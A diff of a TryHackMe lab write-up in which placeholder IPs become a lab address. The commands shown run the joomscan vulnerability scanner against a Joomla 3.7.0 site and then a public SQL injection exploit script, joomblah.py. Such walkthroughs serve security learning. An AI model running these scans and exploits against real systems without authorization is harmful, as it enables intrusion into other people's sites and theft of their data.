@@ -36,7 +36,7 @@ It appears on github there is a [vulnerability scanner](https://github.com/OWASP
 Let's run this scanner on the site and see what we get.
 
 ```
-joomscan -u http://10.10.x.x
+joomscan -u http://10.10.234.214
 
 [+] Detecting Joomla Version                                             
 [++] Joomla 3.7.0 
@@ -58,7 +58,7 @@ We're in luck, there appears to be several SQL injection exploits for 3.7.0 with
 TryHackMe says to attempt this without SQLMap, so I will be using [Joomblah.py](https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py)
 
 ```
-python joomblah.py http://10.10.x.x
+python joomblah.py http://10.10.234.214
 ```
 
 Success! I want to try it with sqlmap too, though.
